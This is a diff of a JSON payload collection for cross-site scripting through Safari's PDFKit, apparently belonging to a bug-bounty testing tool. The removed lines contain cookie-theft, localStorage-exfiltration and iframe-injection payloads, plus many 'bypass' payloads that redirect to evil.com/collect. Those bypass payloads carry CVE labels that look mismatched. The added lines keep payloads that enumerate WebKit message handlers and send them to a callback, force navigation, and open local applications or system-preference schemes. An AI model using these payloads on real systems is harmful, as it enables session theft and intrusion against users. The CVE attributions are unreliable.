@@ -1,9 +1,68 @@
 {
   "metadata": {
     "browser": "safari",
-    "name": "Safari PDFKit Exploits",
-    "description": "Safari/PDFKit specific XSS payloads targeting WebKit, macOS integration, and Objective-C bridge abuse",
-    "total_payloads": 22,
+    "name": "Safari PDFKit Payloads",
+    "renderer": "PDFKit",
+    "browser_priority": "primary",
+    "description": "Validation-first Safari/PDFKit payloads centered on annotation/action handling, WebKit bridge proof, and clearly separated native-helper research.",
+    "supported_research_tiers": [
+      "validation",
+      "aggressive"
+    ],
+    "validation_focus_categories": [
+      "webkit_specific",
+      "dom_access"
+    ],
+    "aggressive_focus_categories": [
+      "file_system",
+      "macos_integration"
+    ],
+    "sbx_focus": [
+      "annotation and URI action validation from PDFKit-rendered content",
+      "message-handler and preview bridge reachability proofs",
+      "low-risk callback or navigation checks before any native-helper testing",
+      "custom-scheme and local-app handoff kept in a separate aggressive track"
+    ],
+    "recommended_profiles": [
+      "high-signal",
+      "bridge-probes",
+      "sbx",
+      "upload-preview"
+    ],
+    "preferred_delivery_paths": [
+      "inline_preview",
+      "native_preview",
+      "embedded_viewer"
+    ],
+    "research_highlights": [
+      "Start with annotation/action and bridge reachability instead of generic DOM-theft payloads",
+      "Use controlled callbacks and bounded navigation to prove PDFKit behavior with low user risk",
+      "Only move to macOS helper or local-file handoff checks after validation payloads succeed"
+    ],
+    "host_context": "pdfkit_preview_viewer",
+    "evidence_level": "medium",
+    "recommended_validation_payloads": [
+      "safari_001",
+      "safari_003",
+      "safari_004",
+      "safari_005",
+      "safari_006"
+    ],
+    "recommended_aggressive_payloads": [
+      "safari_013",
+      "safari_014"
+    ],
+    "default_payload_metadata": {
+      "trigger": "document_open",
+      "preconditions": [
+        "JavaScript enabled in PDFKit-backed rendering"
+      ],
+      "requires_user_gesture": "no",
+      "expected_signal": "webkit_bridge_or_handler_activity",
+      "bug_bounty_value": "medium",
+      "stability": "medium"
+    },
+    "total_payloads": 7,
     "categories": [
       "dom_access",
       "file_system",
@@ -21,210 +80,88 @@
     {
       "id": "safari_001",
       "category": "dom_access",
-      "technique": "basic_domain_alert",
-      "payload": "alert(document.domain)",
-      "description": "Basic Safari PDFKit domain disclosure via alert",
+      "browser": "safari",
+      "technique": "annotation_uri_action_navigation",
+      "payload": "try { location = '{url}?safari=annotation-uri-action'; } catch (e) {}",
+      "description": "Low-risk URI action validation for PDFKit annotation or link handling.",
       "risk_level": "low",
-      "browser": "safari"
-    },
-    {
-      "id": "safari_002",
-      "category": "dom_access",
-      "technique": "dom_cookie_theft",
-      "payload": "document.body.innerHTML='<img src=x onerror=fetch(\"{url}/dom?cookie=\"+document.cookie)>'",
-      "description": "Safari PDFKit DOM manipulation for cookie theft via HTML injection",
-      "risk_level": "high",
-      "browser": "safari"
+      "research_tier": "validation",
+      "bug_bounty_value": "high",
+      "stability": "high"
     },
     {
       "id": "safari_003",
       "category": "webkit_specific",
-      "technique": "webkit_messagehandlers",
-      "payload": "try { webkit.messageHandlers.exploit.postMessage('{url}'); } catch(e) { }",
-      "description": "Safari PDFKit WebKit messageHandlers exploitation",
-      "risk_level": "high",
-      "browser": "safari"
+      "browser": "safari",
+      "technique": "webkit_message_handler_enumeration",
+      "payload": "try { var handlers = (window.webkit && webkit.messageHandlers) ? Object.keys(webkit.messageHandlers).join(',') : 'none'; fetch('{url}/pdfkit-bridge?handlers=' + encodeURIComponent(handlers), {mode: 'no-cors'}); } catch (e) {}",
+      "description": "Enumerate exposed PDFKit message handlers and send a bounded callback for bridge proof.",
+      "risk_level": "medium",
+      "research_tier": "validation",
+      "bug_bounty_value": "high",
+      "stability": "medium"
     },
     {
       "id": "safari_004",
       "category": "webkit_specific",
-      "technique": "webkit_preview_handler",
-      "payload": "try { window.webkit.messageHandlers.preview.postMessage({action: 'navigate', url: '{url}'}); } catch(e) { }",
-      "description": "Safari PDFKit WebKit preview handler abuse for navigation",
-      "risk_level": "high",
-      "browser": "safari"
+      "browser": "safari",
+      "technique": "webkit_preview_handler_probe",
+      "payload": "try { window.webkit.messageHandlers.preview.postMessage({probe: 'pdfkit-preview', target: '{url}'}); } catch (e) {}",
+      "description": "Target the preview-specific WebKit bridge with a simple postMessage proof.",
+      "risk_level": "medium",
+      "research_tier": "validation",
+      "bug_bounty_value": "high",
+      "stability": "medium"
     },
     {
       "id": "safari_005",
-      "category": "macos_integration",
-      "technique": "applescript_execution",
-      "payload": "app.launchURL('osascript://tell%20application%20\"Safari\"%20to%20open%20location%20\"{url}\"', true);",
-      "description": "Safari PDFKit AppleScript execution for Safari navigation",
-      "risk_level": "critical",
-      "browser": "safari"
+      "category": "dom_access",
+      "browser": "safari",
+      "technique": "action_parent_navigation_probe",
+      "payload": "try { top.location = '{url}?safari=action-parent'; } catch (e) { location = '{url}?safari=action-fallback'; }",
+      "description": "Bounded top-level navigation proof for Launch or GoToR-style action handling.",
+      "risk_level": "low",
+      "research_tier": "validation",
+      "bug_bounty_value": "high",
+      "stability": "medium"
     },
     {
       "id": "safari_006",
-      "category": "macos_integration",
-      "technique": "system_preferences_access",
-      "payload": "app.launchURL('x-apple.systempreferences:com.apple.preference.security?url={url}', true);",
-      "description": "Safari PDFKit system preferences access with parameter injection",
-      "risk_level": "medium",
-      "browser": "safari"
-    },
-    {
-      "id": "safari_007",
-      "category": "file_system",
-      "technique": "applications_directory_access",
-      "payload": "app.launchURL('file:///Applications/Calculator.app', true);",
-      "description": "Safari PDFKit file system access to Applications directory",
-      "risk_level": "high",
-      "browser": "safari"
-    },
-    {
-      "id": "safari_008",
-      "category": "file_system",
-      "technique": "system_library_access",
-      "payload": "app.launchURL('file:///System/Library/CoreServices/Finder.app', true);",
-      "description": "Safari PDFKit access to system library applications",
-      "risk_level": "high",
-      "browser": "safari"
-    },
-    {
-      "id": "safari_009",
-      "category": "dom_access",
-      "technique": "localstorage_manipulation",
-      "payload": "localStorage.setItem('pwned','true');fetch('{url}/storage?data='+localStorage.getItem('pwned'))",
-      "description": "Safari PDFKit localStorage manipulation and data exfiltration",
-      "risk_level": "medium",
-      "browser": "safari"
-    },
-    {
-      "id": "safari_010",
-      "category": "dom_access",
-      "technique": "iframe_injection",
-      "payload": "document.body.innerHTML='<iframe src=\"javascript:fetch(\\'{url}/iframe?domain=\\'+parent.document.domain)\"></iframe>'",
-      "description": "Safari PDFKit iframe injection for parent context access",
-      "risk_level": "high",
-      "browser": "safari"
-    },
-    {
-      "id": "safari_011",
       "category": "webkit_specific",
-      "technique": "clipboard_manipulation",
-      "payload": "navigator.clipboard.writeText('Clipboard text compromised').then(function(){fetch('{url}/clipboard?status=compromised')}).catch(function(err){fetch('{url}/clipboard?error='+encodeURIComponent(err))});",
-      "description": "Safari PDFKit clipboard access and manipulation",
-      "risk_level": "medium",
-      "browser": "safari"
-    },
-    {
-      "id": "safari_012",
-      "category": "webkit_specific",
-      "technique": "cve_2022_32792_exploit",
-      "payload": "location='javascript:/*</script><svg/onload=fetch(\"{url}/cve?domain=\"+document.domain)>//';//'",
-      "description": "Safari PDFKit CVE-2022-32792 XSS protection bypass exploit",
-      "risk_level": "critical",
-      "browser": "safari"
+      "browser": "safari",
+      "technique": "sendbeacon_callback_probe",
+      "payload": "try { navigator.sendBeacon('{url}/pdfkit-beacon', 'probe=pdfkit-action'); } catch (e) { fetch('{url}/pdfkit-beacon?fallback=1', {mode: 'no-cors'}); }",
+      "description": "Controlled callback proof for low-risk validation when URL actions are filtered.",
+      "risk_level": "low",
+      "research_tier": "validation",
+      "bug_bounty_value": "high",
+      "stability": "medium"
     },
     {
       "id": "safari_013",
-      "category": "webkit_specific",
+      "category": "file_system",
       "browser": "safari",
-      "technique": "webkit_animation_worklet_2024",
-      "payload": "try{if('animationWorklet'in CSS){CSS.animationWorklet.addModule('data:application/javascript,registerAnimator(\\'myAnimator\\',class{animate(){Function(\\'parent.location=\"https://evil.com/collect\"\\')();}});');}else{throw new Error('Animation Worklet not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Safari WebKit Animation Worklet bypass using CSS worklet execution",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-32373"
+      "technique": "local_application_handoff_probe",
+      "payload": "try { window.open('file:///Applications/Calculator.app', '_self'); } catch (e) {}",
+      "description": "Aggressive follow-up to test whether PDFKit can hand off local application paths.",
+      "risk_level": "medium",
+      "research_tier": "aggressive",
+      "requires_user_gesture": "possible",
+      "bug_bounty_value": "low",
+      "stability": "experimental"
     },
     {
       "id": "safari_014",
-      "category": "webkit_specific",
+      "category": "macos_integration",
       "browser": "safari",
-      "technique": "webkit_image_capture_bypass_2024",
-      "payload": "try{if('ImageCapture'in window){navigator.mediaDevices.getUserMedia({video:true}).then(stream=>{const track=stream.getVideoTracks()[0];const imageCapture=new ImageCapture(track);imageCapture.takePhoto().then(()=>Function('parent.location=\"https://evil.com/collect\"')());});}else{throw new Error('ImageCapture not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Safari WebKit ImageCapture bypass using camera access trigger",
+      "technique": "custom_scheme_helper_probe",
+      "payload": "try { location = 'x-apple.systempreferences:com.apple.preference.security'; } catch (e) {}",
+      "description": "Aggressive custom-scheme handoff check kept separate from validation-first PDFKit proofs.",
       "risk_level": "medium",
-      "cve_reference": "CVE-2023-27932"
-    },
-    {
-      "id": "safari_015",
-      "category": "webkit_specific",
-      "browser": "safari",
-      "technique": "webkit_payment_request_bypass_2024",
-      "payload": "try{if('PaymentRequest'in window){const supportedInstruments=[{supportedMethods:'basic-card'}];const details={total:{label:'Total',amount:{currency:'USD',value:'1.00'}}};const request=new PaymentRequest(supportedInstruments,details);request.show().then(()=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Safari WebKit Payment Request bypass using payment API trigger",
-      "risk_level": "low",
-      "cve_reference": "CVE-2023-32409"
-    },
-    {
-      "id": "safari_016",
-      "category": "webkit_specific",
-      "browser": "safari",
-      "technique": "webkit_contact_picker_bypass_2024",
-      "payload": "try{if('contacts'in navigator){navigator.contacts.select(['name','email']).then(contacts=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Contact Picker not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Safari WebKit Contact Picker bypass using contacts API access",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-27932"
-    },
-    {
-      "id": "safari_017",
-      "category": "webkit_specific",
-      "browser": "safari",
-      "technique": "webkit_device_motion_bypass_2024",
-      "payload": "try{if('DeviceMotionEvent'in window){const handler=()=>{window.removeEventListener('devicemotion',handler);Function('parent.location=\"https://evil.com/collect\"')();};window.addEventListener('devicemotion',handler);setTimeout(()=>window.dispatchEvent(new DeviceMotionEvent('devicemotion')),100);}else{throw new Error('DeviceMotion not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Safari WebKit DeviceMotion bypass using sensor event trigger",
-      "risk_level": "low",
-      "cve_reference": "CVE-2023-32409"
-    },
-    {
-      "id": "safari_018",
-      "category": "webkit_specific",
-      "browser": "safari",
-      "technique": "webkit_screen_wake_lock_bypass_2024",
-      "payload": "try{if('wakeLock'in navigator){navigator.wakeLock.request('screen').then(wakeLock=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Wake Lock not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Safari WebKit Screen Wake Lock bypass using power management API",
-      "risk_level": "low",
-      "cve_reference": "CVE-2023-32373"
-    },
-    {
-      "id": "safari_019",
-      "category": "webkit_specific",
-      "browser": "safari",
-      "technique": "webkit_web_locks_bypass_2024",
-      "payload": "try{if('locks'in navigator){navigator.locks.request('resource',()=>Function('parent.location=\"https://evil.com/collect\"')());}else{throw new Error('Web Locks not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Safari WebKit Web Locks bypass using resource locking API",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-27932"
-    },
-    {
-      "id": "safari_020",
-      "category": "webkit_specific",
-      "browser": "safari",
-      "technique": "webkit_background_sync_bypass_2024",
-      "payload": "try{if('serviceWorker'in navigator&&'sync'in window.ServiceWorkerRegistration.prototype){navigator.serviceWorker.register('data:application/javascript,self.addEventListener(\\'sync\\',()=>{});').then(reg=>reg.sync.register('background-sync').then(()=>Function('parent.location=\"https://evil.com/collect\"')()));}else{throw new Error('Background Sync not available');}}catch(e){eval('parent.window.location=\"https://evil.com/collect\"');}",
-      "description": "Safari WebKit Background Sync bypass using service worker sync",
-      "risk_level": "high",
-      "cve_reference": "CVE-2023-32373"
-    },
-    {
-      "id": "safari_021",
-      "category": "webkit_specific",
-      "browser": "safari",
-      "technique": "webkit_presentation_api_bypass_2024",
-      "payload": "try{if('presentation'in navigator){const request=new PresentationRequest(['https://example.com']);request.start().then(connection=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('Presentation API not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Safari WebKit Presentation API bypass using display casting trigger",
-      "risk_level": "low",
-      "cve_reference": "CVE-2023-32409"
-    },
-    {
-      "id": "safari_022",
-      "category": "webkit_specific",
-      "browser": "safari",
-      "technique": "webkit_file_system_access_bypass_2024",
-      "payload": "try{if('showOpenFilePicker'in window){window.showOpenFilePicker().then(fileHandles=>Function('parent.location=\"https://evil.com/collect\"')()).catch(()=>eval('parent.window.location=\"https://evil.com/collect\"'));}else{throw new Error('File System Access not available');}}catch(e){Function('parent.location=\"https://evil.com/collect\"')();}",
-      "description": "Safari WebKit File System Access bypass using file picker API",
-      "risk_level": "medium",
-      "cve_reference": "CVE-2023-27932"
+      "research_tier": "aggressive",
+      "requires_user_gesture": "possible",
+      "bug_bounty_value": "low",
+      "stability": "experimental"
     }
   ]
 }
